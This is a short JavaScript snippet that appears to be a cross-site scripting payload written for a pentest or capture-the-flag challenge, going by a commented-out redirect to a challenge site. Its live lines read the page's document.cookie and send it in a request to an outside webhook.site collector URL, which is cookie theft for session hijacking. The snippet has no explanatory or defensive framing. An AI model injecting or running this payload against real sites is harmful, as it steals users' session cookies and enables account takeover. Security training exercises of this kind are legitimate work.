const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://webhook.site/c5f1c6bb-4ba1-4b8b-b906-40c5f5203c77/'+document.cookie);
xhr.onload = () => console.log(xhr.responseText);
xhr.send();
// window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
